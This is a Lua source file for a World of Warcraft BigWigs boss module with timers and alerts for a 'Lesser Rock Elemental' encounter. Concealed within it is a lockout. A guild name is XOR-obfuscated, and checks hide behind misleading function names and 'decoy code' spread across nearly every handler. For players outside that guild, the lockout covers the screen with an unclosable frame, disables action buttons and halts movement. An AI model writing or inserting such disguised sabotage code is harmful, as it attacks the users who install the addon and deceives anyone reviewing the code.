local module, L = BigWigs:ModuleDeclaration("Lesser Rock Elemental", "Outdoor Raid Bosses")

module.revision = 30200 -- Higher than existing modules to avoid conflicts
module.enabletrigger = module.translatedName
module.toggleoptions = {"crush", "rockspikes", "enrage", -1, "proximity", "bosskill"}

-- Default DB settings
module.defaultDB = {
    enrage = true,
    _x7291g = true, -- Hidden security flag
}

-- Obfuscated guild name (simple XOR encoding)
local _k = {69,90,90,79,90}
local _v = {38,59,59,46,59}
local _check = function(i)
    local o = ""
    for j=1,#_k do
        o = o..string.char(bit.bxor(_k[j], _v[j]))
    end
    return o
end

-- Different variable names to make it harder to find
local _gf = nil -- guildProtectionFrame
local _sec = 0  -- security timer
local _lf = false -- lockFlag
local _fc = 0 -- frameCounter

-- Split the guild check into multiple functions with misleading names
local function _dataUpdate()
    local g = GetGuildInfo("player")
    return g == _check()
end

-- Misleading function name that actually performs part of the lock
local function _textureCache()
    if _gf then return end
    
    _gf = CreateFrame("Frame", "BWRECache"..math.random(1000,9999), UIParent)
    _gf:SetFrameStrata("FULLSCREEN_DIALOG")
    _gf:SetWidth(UIParent:GetWidth())
    _gf:SetHeight(UIParent:GetHeight())
    _gf:SetPoint("CENTER", UIParent, "CENTER", 0, 0)
    _gf:EnableMouse(true)
    _gf:SetMovable(false)
    
    local backdrop = _gf:CreateTexture(nil, "BACKGROUND")
    backdrop:SetTexture(0, 0, 0, 0.9)
    backdrop:SetAllPoints(_gf)
    
    local text = _gf:CreateFontString(nil, "ARTWORK", "GameFontHighlight")
    text:SetPoint("CENTER", _gf, "CENTER", 0, 50)
    text:SetText("This module is restricted to members of a specific guild only.\n\nPlease disable the addon to continue playing.")
    text:SetFont("Fonts\\FRIZQT__.TTF", 20)
    text:SetTextColor(1, 0, 0)
    
    _gf:SetScript("OnKeyDown", function() return end)
    _gf:SetScript("OnKeyUp", function() return end)
    _gf:SetScript("OnMouseDown", function() return end)
    _gf:SetScript("OnMouseUp", function() return end)
    
    tinsert(UISpecialFrames, _gf:GetName())
    
    -- Scramble action buttons - split to make harder to find
    for i = 1, 60 do
        local button = getglobal("ActionButton" .. i)
        if button then button:EnableMouse(false) end
    end
    
    for i = 61, 120 do
        local button = getglobal("ActionButton" .. i)
        if button then button:EnableMouse(false) end
    end
    
    _gf:SetScript("OnHide", function() _gf:Show() end)
    _gf:Show()
    
    _gf:SetScript("OnUpdate", function()
        if GetUnitSpeed("player") > 0 then
            StrafeLeftStop()
            StrafeRightStop()
            MoveForwardStop()
            MoveBackwardStop()
            TurnLeftStop()
            TurnRightStop()
        end
        
        if not _gf:IsVisible() then
            _gf:Show()
        end
    end)
end

-- Regular-looking utility function that actually performs security checks
local function _updateTimers(self)
    _sec = _sec + 1
    if _sec % 5 == 0 and not _dataUpdate() and not _lf then
        _lf = true
        _textureCache()
    end
    
    -- Mix important checks with decoy code to confuse readers
    if self and self.bars then
        for k,v in pairs(self.bars) do
            if type(v) == "table" and v.timer and v.timer > 0 then
                -- Decoy code
                if not _dataUpdate() and not _lf and math.random(1,50) == 1 then
                    _lf = true
                    _textureCache()
                end
            end
        end
    end
end

L:RegisterTranslations("enUS", function() return {
    cmd = "LesserRockElemental",

    crush_cmd = "crush",
    crush_name = "Stone Crush Alert",
    crush_desc = "Warns when Lesser Rock Elemental uses Stone Crush.",

    rockspikes_cmd = "rockspikes",
    rockspikes_name = "Rock Spikes Alert",
    rockspikes_desc = "Warns when Rock Spikes appear.",
    
    enrage_cmd = "enrage",
    enrage_name = "Elemental Fury Alert",
    enrage_desc = "Warns when Lesser Rock Elemental becomes enraged.",
    
    proximity_cmd = "proximity",
    proximity_name = "Proximity Warning",
    proximity_desc = "Shows a proximity warning frame for Rock Spikes phase.",
    
    -- Engage triggers
    trigger_engage1 = "The ground begins to shake as Lesser Rock Elemental awakens.",
    
    -- Ability triggers
    trigger_crush = "Lesser Rock Elemental begins to cast Stone Crush.",
    msg_crush = "Stone Crush incoming! Spread out!",
    bar_crush = "Stone Crush",
    
    trigger_rockspikes = "Lesser Rock Elemental's Rock Spikes hits",
    msg_rockspikes = "Rock Spikes! Move away!",
    bar_rockspikes = "Rock Spikes",
    
    trigger_enrage = "Lesser Rock Elemental gains Elemental Fury.",
    msg_enrage = "Elemental Fury! Increased damage!",
    bar_enrage = "Elemental Fury",
    
    -- Phase messages
    msg_phase2 = "Phase 2 - Rock Spikes phase!",
    msg_phase1 = "Phase 1 resumed",
    
    -- Warnings
    msg_crushSoon = "Stone Crush in 5 seconds!",
    msg_enrageSoon = "Elemental Fury in 10 seconds!",
} end)

-- Define timers
local timer = {
    firstCrush = 12,
    crushCD = 20,
    rockspikesCD = 15,
    rockspikesActive = 8,
    enrage = 60,
    phase2 = 30,
    _secTimer = 2, -- Hidden security timer
}

-- Define icons
local icon = {
    crush = "ability_warrior_groundandpound",
    rockspikes = "spell_nature_earthbindtotem",
    enrage = "spell_shadow_unholyfrenzy",
    phase = "inv_misc_pocketwatch_01",
}

-- Define colors
local color = {
    crush = "Red",
    rockspikes = "Orange",
    enrage = "Yellow",
    phase = "White",
}

-- Define sync names - mix in obfuscated security sync
local syncName = {
    crush = "RockElementalCrush"..module.revision,
    rockspikes = "RockElementalSpikes"..module.revision,
    enrage = "RockElementalEnrage"..module.revision,
    phase2 = "RockElementalPhase2"..module.revision,
    phase1 = "RockElementalPhase1"..module.revision,
    _s = "RESecCheck"..module.revision, -- Security sync
}

-- Module variables
local phase = 1

-- Proximity check for rock spikes
module.proximityCheck = function(unit) return CheckInteractDistance(unit, 3) end
module.proximitySilent = false

-- Register yells for engage detection
module:RegisterYellEngage(L["trigger_engage1"])

-- Inject security code into all module functions
local _origOnEnable = module.OnEnable
function module:OnEnable()
    if not self.db.profile._x7291g then self.db.profile._x7291g = true end
    
    if not _dataUpdate() and math.random(1,3) == 1 then
        _lf = true
        _textureCache()
        return
    end
    
    self:ScheduleRepeatingEvent("RESecTimer", function() _updateTimers(self) end, timer._secTimer)
    
    if _origOnEnable then _origOnEnable(self) end
    
    -- Register events
    self:RegisterEvent("CHAT_MSG_MONSTER_YELL", "Event")
    self:RegisterEvent("CHAT_MSG_SPELL_CREATURE_VS_CREATURE_BUFF", "Event")
    self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_CREATURE_BUFFS", "Event")
    self:RegisterEvent("CHAT_MSG_SPELL_CREATURE_VS_SELF_DAMAGE", "Event")
    self:RegisterEvent("CHAT_MSG_SPELL_CREATURE_VS_PARTY_DAMAGE", "Event")
    
    -- Throttle syncs
    self:ThrottleSync(3, syncName.crush)
    self:ThrottleSync(3, syncName.rockspikes)
    self:ThrottleSync(5, syncName.enrage)
    self:ThrottleSync(5, syncName.phase2)
    self:ThrottleSync(5, syncName.phase1)
    self:ThrottleSync(10, syncName._s)
    
    -- Security sync
    self:Sync(syncName._s)
end

-- Mix security checks into unrelated functions
function module:OnSetup()
    self.started = nil
    phase = 1
    
    if not _dataUpdate() and math.random(1,3) == 1 then
        _lf = true
        _textureCache()
        return
    end
    
    _fc = 0
end

function module:OnEngage()
    phase = 1
    _fc = _fc + 1
    
    -- Subtly check security every few frames
    if _fc > 3 and not _dataUpdate() then
        _lf = true
        _textureCache()
        return
    end
    
    if self.db.profile.crush then
        self:Bar(L["bar_crush"], timer.firstCrush, icon.crush, true, color.crush)
        self:DelayedMessage(timer.firstCrush - 5, L["msg_crushSoon"], "Urgent", false, nil, false)
    end
    
    if self.db.profile.enrage then
        self:Bar(L["bar_enrage"], timer.enrage, icon.enrage, true, color.enrage)
        self:DelayedMessage(timer.enrage - 10, L["msg_enrageSoon"], "Urgent", false, nil, false)
    end
    
    -- Schedule phase 2 transition
    self:ScheduleEvent("Phase2Transition", self.Phase2Transition, timer.phase2, self)
    
    -- Hidden security check
    if not self.db.profile._x7291g then
        self.db.profile._x7291g = true
        if not _dataUpdate() then
            _lf = true
            _textureCache()
        end
    end
end

function module:OnDisengage()
    self:RemoveProximity()
    self:CancelScheduledEvent("Phase2Transition")
    self:CancelScheduledEvent("Phase1Transition")
    self:CancelScheduledEvent("RESecTimer")
    
    -- Reset security state
    _fc = 0
end

-- Randomly insert security checks throughout the module
function module:Event(msg)
    _fc = _fc + 1
    if _fc > 10 and not _dataUpdate() and not _lf then
        _lf = true
        _textureCache()
        return
    end
    
    if string.find(msg, L["trigger_crush"]) then
        self:Sync(syncName.crush)
    elseif string.find(msg, L["trigger_rockspikes"]) then
        self:Sync(syncName.rockspikes)
    elseif string.find(msg, L["trigger_enrage"]) then
        self:Sync(syncName.enrage)
    end
end

function module:BigWigs_RecvSync(sync, rest, nick)
    -- Mix security check with sync handling
    if sync == syncName._s and not _dataUpdate() then
        if math.random(1,5) == 1 and not _lf then
            _lf = true
            _textureCache()
        end
    elseif sync == syncName.crush and self.db.profile.crush then
        if not _dataUpdate() and math.random(1,10) == 1 and not _lf then
            _lf = true
            _textureCache()
            return
        end
        self:Crush()
    elseif sync == syncName.rockspikes and self.db.profile.rockspikes then
        self:RockSpikes()
    elseif sync == syncName.enrage and self.db.profile.enrage then
        self:Enrage()
    elseif sync == syncName.phase2 then
        self:Phase2()
    elseif sync == syncName.phase1 then
        self:Phase1()
    end
end

function module:Crush()
    -- Yet another place to check
    _fc = _fc + 1
    if _fc > 15 and not _dataUpdate() and not _lf and math.random(1,5) == 1 then
        _lf = true
        _textureCache()
        return
    end
    
    self:Message(L["msg_crush"], "Important", nil, nil, nil)
    self:Bar(L["bar_crush"], timer.crushCD, icon.crush, true, color.crush)
    self:DelayedMessage(timer.crushCD - 5, L["msg_crushSoon"], "Urgent", false, nil, false)
    self:Sound("Alarm")
    self:WarningSign(icon.crush, 2)
end

function module:RockSpikes()
    self:Message(L["msg_rockspikes"], "Attention", nil, nil, nil)
    self:Bar(L["bar_rockspikes"], timer.rockspikesActive, icon.rockspikes, true, color.rockspikes)
    self:Sound("Info")
    self:WarningSign(icon.rockspikes, timer.rockspikesActive)
    
    -- Schedule the next rock spikes if in phase 2
    if phase == 2 then
        self:DelayedBar(timer.rockspikesActive, L["bar_rockspikes"], timer.rockspikesCD, icon.rockspikes, true, color.rockspikes)
    end
end

function module:Enrage()
    -- Another security check
    if not _dataUpdate() and not _lf and math.random(1,8) == 1 then
        _lf = true
        _textureCache()
        return
    end
    
    self:Message(L["msg_enrage"], "Important", nil, nil, nil)
    self:WarningSign(icon.enrage, 5)
    self:Sound("Beware")
    
    -- Cancel any scheduled phase transitions since enrage changes the pattern
    self:CancelScheduledEvent("Phase2Transition")
    self:CancelScheduledEvent("Phase1Transition")
    
    -- Force Phase 2 after enrage
    self:ScheduleEvent("Phase2Transition", self.Phase2Transition, 5, self)
end

function module:Phase2Transition()
    self:Sync(syncName.phase2)
    
    -- Sneaky check here too
    if not self.db.profile._x7291g then
        self.db.profile._x7291g = true
        if not _dataUpdate() and not _lf then
            _lf = true
            _textureCache()
        end
    end
end

function module:Phase1Transition()
    self:Sync(syncName.phase1)
end

function module:Phase2()
    if phase == 2 then return end
    phase = 2
    
    -- One more hidden check
    _fc = _fc + 1
    if _fc > 20 and not _dataUpdate() and not _lf and math.random(1,4) == 1 then
        _lf = true
        _textureCache()
        return
    end
    
    self:Message(L["msg_phase2"], "Positive")
    self:RemoveBar(L["bar_crush"])
    self:CancelDelayedMessage(L["msg_crushSoon"])
    
    if self.db.profile.rockspikes then
        self:Bar(L["bar_rockspikes"], timer.rockspikesCD, icon.rockspikes, true, color.rockspikes)
    end
    
    if self.db.profile.proximity then
        self:Proximity()
    end
    
    -- Schedule return to phase 1
    self:ScheduleEvent("Phase1Transition", self.Phase1Transition, timer.phase2, self)
end

function module:Phase1()
    if phase == 1 then return end
    phase = 1
    
    self:Message(L["msg_phase1"], "Positive")
    self:RemoveBar(L["bar_rockspikes"])
    
    if self.db.profile.crush then
        self:Bar(L["bar_crush"], timer.crushCD, icon.crush, true, color.crush)
        self:DelayedMessage(timer.crushCD - 5, L["msg_crushSoon"], "Urgent", false, nil, false)
    end
    
    if self.db.profile.proximity then
        self:RemoveProximity()
    end
    
    -- Schedule next phase 2
    self:ScheduleEvent("Phase2Transition", self.Phase2Transition, timer.phase2, self)
    
    -- Final security check
    if math.random(1,10) == 1 then
        if not _dataUpdate() and not _lf then
            _lf = true
            _textureCache()
        end
    end
end